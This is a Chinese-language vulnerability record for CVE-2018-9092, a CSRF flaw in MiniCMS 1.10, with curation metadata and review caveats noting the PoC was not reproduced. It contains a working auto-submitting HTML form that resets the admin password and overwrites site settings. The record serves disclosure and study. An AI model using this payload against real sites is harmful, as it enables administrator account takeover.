---
cve: "CVE-2018-9092"
source: "Mr-xn/Penetration_Testing_POC"
product: "MiniCMS1.10"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-9092"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "MiniCMS 1.10存在CSRF漏洞可增加管理员账户2"
prerequisites: "来源所述条件，未列明部分仍待核：已登录管理员、跨站自动POST带Cookie"
side_effects: "未执行；本文需注意的操作影响：标题增加管理员，但表单发conf.php同时修改站名/链接与user_name/pass，更可能修改现有配置账号，需要issue14核对账户动作；其他站点配置会被覆盖，副作用不能省略"
source_status: "unknown"
id: "vw-6e6de65ca8004412cd1ae9e8"
entity_id: "ve-6e6de65ca8004412cd1ae9e8"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已登录管理员、跨站自动POST带Cookie

- **适用与权限边界（1）**：标题增加管理员，但表单发conf.php同时修改站名/链接与user_name/pass，更可能修改现有配置账号，需要issue14核对账户动作。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：PoC自动提交明确，HTMLhead/body闭合次序不规范；没有结果/服务端逻辑。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（3）**：其他站点配置会被覆盖，副作用不能省略。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# MiniCMS 1.10存在CSRF漏洞可增加管理员账户2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|MiniCMS 1.10存在CSRF漏洞可增加管理员账户|2018-03-30|zixian（me@zixian.org、zixian@5ecurity.cn）|[https://github.com/bg5sbk/MiniCMS](https://github.com/bg5sbk/MiniCMS) | [https://github.com/bg5sbk/MiniCMS](https://github.com/bg5sbk/MiniCMS) |1.10| [CVE-2018-9092](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9092)|  

#### 漏洞概述  

> MiniCMS 1.10存在CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可增加管理员账户。MiniCMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/bg5sbk/MiniCMS/issues/14)告知作者。  

### POC实现代码如下：  

> CSRF测试页面代码如下：
``` html
<html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=GB2312">
 <title>test</title>
 <body>
 <form action="http://127.0.0.1/minicms/mc-admin/conf.php" method="post">
 <input type="hidden" name="site_name" value="hack123" />  
 <input type="hidden" name="site_desc" value="hacktest" />  
 <input type="hidden" name="site_link" value="http://127.0.0.1/minicms" />  
 <input type="hidden" name="user_nick" value="hack" />  
 <input type="hidden" name="user_name" value="admin" />  
 <input type="hidden" name="user_pass" value="hackpass" />  
 <input type="hidden" name="comment_code" value="" />  
 <input type="hidden" name="save" value=" " /> 
 </form>
 <script>
  document.forms[0].submit();
 </script>
 </body>
 </head>
 </html>
 ```


---

> 来源：Mr-xn/Penetration_Testing_POC
